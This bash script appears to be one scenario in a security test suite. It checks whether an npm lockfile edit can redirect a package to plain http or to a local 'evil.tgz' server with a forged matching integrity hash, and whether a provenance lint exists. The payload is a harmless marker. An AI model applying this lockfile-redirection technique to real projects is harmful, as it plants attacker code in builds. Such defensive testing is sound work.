#!/usr/bin/env bash
# S5 — rewrite one `resolved` URL in apps/mobile/package-lock.json.
#
# Attack: the lockfile is the only supply-chain control for apps/mobile. If a
# lockfile edit can point a package at plain http:// or at a non-registry host,
# whoever can land that edit ships arbitrary code into the app build. The
# integrity hash does not help: the attacker who rewrites `resolved` also writes
# the matching sha512 of their own tarball.
#
# Checks (HELD only if something REJECTS the non-registry provenance):
#   s5.a  resolved → http://registry.npmjs.org/…   `npm ci --dry-run --no-audit`  → expect non-zero
#   s5.b  resolved → http://127.0.0.1:<port>/evil.tgz with matching integrity, real
#         `npm ci --ignore-scripts` → expect non-zero; observe whether the attacker
#         tarball landed in node_modules
#   s5.c  repo-level lockfile provenance lint (lockfile-lint / allowed-hosts / a
#         resolved-URL check in scripts or CI) exists
#
# Env: ATTACK_EVIL_PORT (default 4874), ATTACK_TARGET_NPM (default zustand)
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

TMP="$(mktemp -d)"
PORT="${ATTACK_EVIL_PORT:-4874}"
TARGET="${ATTACK_TARGET_NPM:-zustand}"
SERVER_PID=""
cleanup() {
  [ -n "$SERVER_PID" ] && kill "$SERVER_PID" 2>/dev/null || true
  rm -rf "$TMP"
}
trap cleanup EXIT

rewrite_resolved() { # <dir> <name> <url> [integrity]
  (cd "$1" && node -e '
const fs = require("fs");
const [name, url, integrity] = process.argv.slice(1);
const l = JSON.parse(fs.readFileSync("package-lock.json", "utf8"));
const e = l.packages[`node_modules/${name}`];
if (!e) throw new Error(`${name} not in package-lock.json`);
console.log(`${name}@${e.version}\n  resolved  ${e.resolved} -> ${url}`);
e.resolved = url;
if (integrity) { console.log(`  integrity ${e.integrity} -> ${integrity}`); e.integrity = integrity; }
fs.writeFileSync("package-lock.json", JSON.stringify(l, null, 2) + "\n");
' "$2" "$3" "${4:-}")
}

# ── s5.a plain http:// to the real registry ────────────────────────────────────
temp_export "$TMP/a" apps/mobile/package.json apps/mobile/package-lock.json
rewrite_resolved "$TMP/a/apps/mobile" "$TARGET" "http://registry.npmjs.org/$TARGET/-/$TARGET-$(node -e 'process.stdout.write(require(process.argv[1]).packages[`node_modules/${process.argv[2]}`].version)' "$TMP/a/apps/mobile/package-lock.json" "$TARGET").tgz" >"$OUT/s5a-rewrite.txt"
cat "$OUT/s5a-rewrite.txt" >&2
rc="$(cd "$TMP/a/apps/mobile" && run_capture "$OUT/s5a-npm-ci-dry-run-http.log" npm ci --dry-run --no-audit --no-fund)"
if [ "$rc" != 0 ]; then
  record HELD s5.a-http-resolved "$rc" "$OUT/s5a-npm-ci-dry-run-http.log" "npm ci rejects a plain-http resolved URL"
else
  record BROKEN s5.a-http-resolved "$rc" "$OUT/s5a-npm-ci-dry-run-http.log" "npm ci --dry-run exit 0 with resolved=http://registry.npmjs.org/… (no https enforcement)"
fi

# ── s5.b attacker-controlled host serving a substitute tarball ─────────────────
mkdir -p "$TMP/evil/package"
cat >"$TMP/evil/package/package.json" <<EOF
{ "name": "$TARGET", "version": "0.0.0-attack", "main": "index.js" }
EOF
printf 'module.exports = { ATTACK_TARBALL_LANDED: true };\n' >"$TMP/evil/package/index.js"
tar -czf "$TMP/evil.tgz" -C "$TMP/evil" package
EVIL_INTEGRITY="sha512-$(openssl dgst -sha512 -binary "$TMP/evil.tgz" | base64 -w0)"
echo "$EVIL_INTEGRITY" >"$OUT/s5b-evil.integrity"
(cd "$TMP" && python3 -m http.server "$PORT" --bind 127.0.0.1 >"$OUT/s5b-evil-http-server.log" 2>&1) &
SERVER_PID=$!
SERVED=0
for _ in $(seq 1 50); do
  if curl -s -o /dev/null -f "http://127.0.0.1:$PORT/evil.tgz"; then SERVED=1; break; fi
  sleep 0.1
done
[ "$SERVED" = 1 ] || { log "attacker http server did not come up on 127.0.0.1:$PORT (see $OUT/s5b-evil-http-server.log)"; exit 2; }

temp_export "$TMP/b" apps/mobile/package.json apps/mobile/package-lock.json
rewrite_resolved "$TMP/b/apps/mobile" "$TARGET" "http://127.0.0.1:$PORT/evil.tgz" "$EVIL_INTEGRITY" >"$OUT/s5b-rewrite.txt"
cat "$OUT/s5b-rewrite.txt" >&2
rc="$(cd "$TMP/b/apps/mobile" && run_capture "$OUT/s5b-npm-ci-evil-host.log" npm ci --ignore-scripts --no-audit --no-fund)"
LANDED=0
if [ -f "$TMP/b/apps/mobile/node_modules/$TARGET/index.js" ] && grep -q ATTACK_TARBALL_LANDED "$TMP/b/apps/mobile/node_modules/$TARGET/index.js"; then
  LANDED=1
  cp "$TMP/b/apps/mobile/node_modules/$TARGET/index.js" "$OUT/s5b-installed-index.js"
  cp "$TMP/b/apps/mobile/node_modules/$TARGET/package.json" "$OUT/s5b-installed-package.json"
fi
if [ "$rc" != 0 ] && [ "$LANDED" = 0 ]; then
  record HELD s5.b-nonregistry-host "$rc" "$OUT/s5b-npm-ci-evil-host.log" "npm ci refused the non-registry tarball"
else
  record BROKEN s5.b-nonregistry-host "$rc" "$OUT/s5b-npm-ci-evil-host.log" "npm ci exit $rc; attacker tarball from http://127.0.0.1:$PORT installed into node_modules/$TARGET (landed=$LANDED)"
fi

# ── s5.c any provenance lint in the repo? ──────────────────────────────────────
{
  echo "grep -rnE 'lockfile-lint|allowed-hosts|allowed-schemes|validate-https|resolved' scripts .github package.json apps/mobile/package.json"
  (cd "$REPO_ROOT" && grep -rnE 'lockfile-lint|allowed-hosts|allowed-schemes|validate-https|"resolved"|resolved:' scripts .github package.json apps/mobile/package.json) || echo "(no matches)"
  echo
  echo "non-https or non-registry resolved URLs currently in apps/mobile/package-lock.json:"
  (cd "$REPO_ROOT" && node -e '
const l = require(require("path").resolve(process.argv[1]));
const bad = Object.entries(l.packages).filter(([, e]) => e.resolved && !/^https:\/\/registry\.npmjs\.org\//.test(e.resolved));
console.log(bad.length ? bad.map(([k, e]) => `${k} ${e.resolved}`).join("\n") : "(none — all resolved URLs are https://registry.npmjs.org)");
' apps/mobile/package-lock.json)
} >"$OUT/s5c-provenance-lint.txt" 2>&1
if (cd "$REPO_ROOT" && grep -rqE 'lockfile-lint|allowed-hosts|allowed-schemes|validate-https' scripts .github package.json apps/mobile/package.json); then
  record HELD s5.c-provenance-lint 0 "$OUT/s5c-provenance-lint.txt" "a lockfile provenance lint exists"
else
  record BROKEN s5.c-provenance-lint 1 "$OUT/s5c-provenance-lint.txt" "nothing in scripts/, .github/ or package manifests validates lockfile resolved hosts/schemes"
fi

verdict
